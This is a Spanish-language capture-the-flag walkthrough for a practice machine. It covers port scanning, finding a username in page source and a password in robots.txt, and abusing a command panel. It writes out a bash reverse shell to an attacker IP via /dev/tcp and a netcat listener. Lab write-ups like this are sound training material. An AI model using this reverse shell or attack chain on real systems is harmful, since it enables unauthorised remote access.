
Empezamos realizando un escaneo básico con [[NMAP]]
`nmap -p- --open -sSCV  --min-rate 5000 -n -Pn 10.10.81.88 -oN ScanPorts.txt`

Encontramos levantados los puertos `22 SSH` y `80 HTTP` con un servicio Apache.
Navegamos a la web que esta corriendo en el puerto `80`

En el código fuente encontramos en los comentarios el nombre de usuario `R1ckRul3s`, así que vamos a hacer fuzzing con [[DIRBUSTER]] encontramos un directorio llamado `/login.php` navegamos a el.

Tenemos un usuario pero nos falta una contraseña, en el fuzzing web hemos visto que existe el fichero `/robots.txt` en el encontramos una supuesta contraseña `Wubbalubbadubdub`, al probarla en el login conseguimos acceder.

Encontramos un cuadro donde podemos ejecutar comandos, entonces nos enviaremos una bash y nos pondremos en escucha con [[NETCAT]]

- Reverse Shell
	` bash -c 'bash -i >& /dev/tcp/10.8.28.111/443 0>&1'`

- Ponerse en escucha 
	`nc -lvnp 443 `

Estabilizamos la shell y hacemos el [[01. Tratamiento de la TTY]]

Una vez estabilizado, en el directorio de `/var/www/html` encontramos la primera flag.
Navegando por directorios encontramos `/home/rick` desde esta la segunda flag.
Y la tercera flag se encuentra en el directorio `/root`.
